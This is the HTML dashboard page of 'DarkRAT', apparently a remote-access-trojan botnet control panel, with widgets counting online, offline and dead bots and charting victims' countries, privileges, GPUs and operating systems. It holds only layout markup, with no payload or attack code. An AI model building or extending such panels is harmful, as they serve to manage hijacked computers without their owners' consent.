<style>
.no-padding-bottom {
    padding-bottom: 12px !important;
}
</style>
<div class="page-content">
        <div class="page-header">
          <div class="container-fluid">
            <h2 class="h5 no-margin-bottom">Dashboard</h2>
          </div>
        </div>
        <section class="no-padding-top no-padding-bottom">
          <div class="container-fluid">
            <div class="row">
              <div class="col-md-3 col-sm-6">
                <div class="statistic-block block">
                  <div class="progress-details d-flex align-items-end justify-content-between">
                    <div class="title">
                      <div class="icon"><i class="icon-user-1"></i></div><strong>Online Bots</strong>
                    </div>
                    <div class="number dashtext-1"></div>
                  </div>
                  <div class="progress progress-template">
                    <div role="progressbar" style="width: 30%" aria-valuenow="30" aria-valuemin="0" aria-valuemax="100" class="progress-bar progress-bar-template dashbg-1"></div>
                  </div>
                </div>
              </div>
              <div class="col-md-3 col-sm-6">
                <div class="statistic-block block">
                  <div class="progress-details d-flex align-items-end justify-content-between">
                    <div class="title">
                      <div class="icon"><i class="icon-contract"></i></div><strong>Offline Bots</strong>
                    </div>
                    <div class="number dashtext-2"></div>
                  </div>
                  <div class="progress progress-template">
                    <div role="progressbar" style="width: 70%" aria-valuenow="70" aria-valuemin="0" aria-valuemax="100" class="progress-bar progress-bar-template dashbg-2"></div>
                  </div>
                </div>
              </div>
              <div class="col-md-3 col-sm-6">
                <div class="statistic-block block">
                  <div class="progress-details d-flex align-items-end justify-content-between">
                    <div class="title">
                      <div class="icon"><i class="icon-paper-and-pencil"></i></div><strong>Dead Bots</strong>
                    </div>
                    <div class="number dashtext-3"></div>
                  </div>
                  <div class="progress progress-template">
                    <div role="progressbar" style="width: 55%" aria-valuenow="55" aria-valuemin="0" aria-valuemax="100" class="progress-bar progress-bar-template dashbg-3"></div>
                  </div>
                </div>
              </div>
              <div class="col-md-3 col-sm-6">
                <div class="statistic-block block">
                  <div class="progress-details d-flex align-items-end justify-content-between">
                    <div class="title">
                      <div class="icon"><i class="icon-writing-whiteboard"></i></div><strong>Total Bots</strong>
                    </div>
                    <div class="number dashtext-4"></div>
                  </div>
                  <div class="progress progress-template">
                    <div role="progressbar" style="width: 35%" aria-valuenow="35" aria-valuemin="0" aria-valuemax="100" class="progress-bar progress-bar-template dashbg-4"></div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </section>
        <section class="no-padding-bottom">
          <div class="container-fluid">
            <div class="row">
                <div class="col-lg-8">
                   <div id="vmap" style="width: 100%; height: 290px;"></div>
                  </div>
              <div class="col-lg-4">
                <div class="bar-chart block no-margin-bottom">
                  <div class="title"><strong>Privileges</strong></div>
                  <canvas id="barChartPrivileges"></canvas>
                </div>
     
              </div>
              
            </div>
          </div>
        </section>

        
        <section class="margin-bottom-sm">
          <div class="container-fluid">
            <div class="row d-flex align-items-stretch">
              
              <div class="col-lg-4">   
                <div class="stats-with-chart-1 block">
                  <div class="title"> <strong class="d-block">Top Countries</strong><span class="d-block">Top 5 Countries</span></div>
                  <div class="row d-flex align-items-end justify-content-between">
               
                    <div class="col-10">
                      <div class="bar-chart chart">
                        <canvas id="countryPieChart"></canvas>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
              <div class="col-lg-4">   
                <div class="stats-with-chart-2 block">
                  <div class="title"> <strong class="d-block">Bots GPU</strong><span class="d-block">GPU Statistic of Botnet</span></div>
                  <div class="row d-flex align-items-end justify-content-between">
            
                    <div class="col-10">
                      <div class="bar-chart chart">
                        <canvas id="gpubrandsPieChart"></canvas>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
              <div class="col-lg-4">   
                <div class="stats-with-chart-3 block">
                  <div class="title"> <strong class="d-block">Operating Systems</strong><span class="d-block">Top 5 Operating Systems</span></div>
                  <div class="row d-flex align-items-end justify-content-between">
             
                    <div class="col-12">
                      <div class="bar-chart chart">
                        <canvas id="systemPieChart"></canvas>
                      </div>
                    </div>
                  </div>
                </div>
              </div>

            </div>
          </div>
        </section>
        

        </section>
        <footer class="footer">
          <div class="footer__block block no-margin-bottom">
            <div class="container-fluid text-center">
              <!-- Please do not remove the backlink to us unless you support us at https://bootstrapious.com/donate. It is part of the license conditions. Thank you for understanding :)-->
              <p class="no-margin-bottom">2018 &copy; DarkRAT by DarkSpider</a>.</p>
            </div>
          </div>
        </footer>
      </div>
    </div>